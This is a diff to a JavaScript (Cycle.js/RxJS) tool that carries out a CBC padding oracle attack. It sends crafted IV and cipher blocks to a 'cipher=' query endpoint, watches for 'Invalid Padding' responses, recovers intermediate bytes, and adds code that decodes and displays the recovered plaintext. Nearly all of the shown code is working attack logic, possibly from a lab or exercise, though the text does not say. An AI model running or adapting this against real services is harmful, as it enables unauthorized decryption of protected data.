@@ -49,7 +49,19 @@ function string2hex(str) {
     return bytes;
 }
 
-//str = String.fromCharCode.apply(String, bytes);
+function hex2Message (hex)
+{
+	var trimMsg=[];
+	
+	for (var i=0; i < hex.length; ++i)
+	{
+		if (hex[i] !== 0)
+			trimMsg.push(hex[i]);
+	}
+		
+	return String.fromCharCode.apply(String, trimMsg);
+}
+
 
 function main(sources) {
 
@@ -91,28 +103,31 @@ function main(sources) {
 	
 	for (index=0; index < 16 && originalIV[index] == lastIV[index]; ++index);
 
-	//if (index===16) index=15;
-	
 	var zeroBlock=Array.apply(null, Array(16)).map(() => 0);
 	var padBlock=zeroBlock.slice();
 	for (var i=index; i < 16; ++i) padBlock[i]=(16-index);
 	
 	var acc=zip_blocks ([originalIV, lastIV, padBlock]);
 	
-	//padList idx=replicate  (16-idx) 0++ replicate idx (fromIntegral idx)
-	//idxList a idx=replicate (15-idx) 0++[a]++replicate idx 0
-
-	//padList (idx+1)) (idxList a idx) acc iv
 	//newIV=IV ^ pads ^ acc ^ idxl
-
 	
 	if (index===0) return {completed: true, candidates: [], result: acc, key: hex2string(cipher)};
 	
 	index=index-1;
 	
-	//2..128
-	var _candidates=Array.apply(null, Array(126))
-		.map((_, i) => i+2)
+	//special case for padding
+	//todo this will work only for text messages
+	if (index===14 && acc[15] < 16)
+	{
+		index=15-acc[15];
+		acc=zeroBlock.slice();
+		
+		for (var i=index; i < 16; ++i) acc[i]=15-index;
+	}
+	
+	//1..128
+	var _candidates=Array.apply(null, Array(127))
+		.map((_, i) => i+1)
 		.map (char =>{
 			var newPadBlock=zeroBlock.slice();
 			for (var i=index; i < 16; ++i) newPadBlock[i]=(16-index);
@@ -154,13 +169,12 @@ function main(sources) {
 		}
 		return cipherBlocks;
 	})
-	//.startWith({});
-
+	
 
 	const http_response$ = sources.HTTP
 		.filter(res$ => res$.request.url.indexOf(USERS_URL) === 0)
 		.mergeAll()
-		.filter (res=>res.text.indexOf('Invalid Padding') > 0 || res.text.indexOf('OK') > 0)
+		.filter (res=>res.text.indexOf('Invalid Padding') > 0)
 		.map(res => {
 			var idx=res.req.url.indexOf('cipher=');
 			return {IV: res.req.url.substring (idx+7, idx+7+32), cipher: res.req.url.substring (idx+7+32, idx+7+32+32)};
@@ -187,7 +201,9 @@ function main(sources) {
 	const scan_progres$=scan_status$
 		.scan ((acc, status)=>{ //todo rework
 				if (!(status.key===undefined || status.result===undefined))
+				{
 					acc[status.key]=hex2string(status.result);
+				}
 					
 				return acc;
 			}, ({}))
@@ -198,18 +214,7 @@ function main(sources) {
 			Observable.from (candidates.map (cipherblock=>{
 				return {url: USERS_URL+hex2string(cipherblock), method: 'GET'};}))
 		);
-    /*.scan (seconds=>++seconds, 1)
-    //.map(a => {return {url: USERS_URL + String(a), method: 'GET'};})
-
-    //.selectMany (a => Rx.Observable.just(1).map(a => {return {url: USERS_URL + String(a), method: 'GET'};}));
-    .selectMany (a => Observable.range(10, 5))
-    .map(a => {return {url: USERS_URL, method: 'GET'};})*/
-    
- 
-
-
-
-  //const action$=
+   
   
   const vtree$ = Observable.combineLatest(cipher_state$, running_state$, scan_progres$,
 	  (cipher_state, running_state, progres) =>
@@ -225,7 +230,11 @@ function main(sources) {
           li({className: 'search-result'}, [
 			label({style: searchLabelStyle}, result+':'+progres[result])
           ])
-        ))
+        )),
+		h1(),
+		//todoproper sorting needed
+		Object.keys(progres).map(result =>
+			label(hex2Message(string2hex(progres[result]))))
 		
       ])
     );
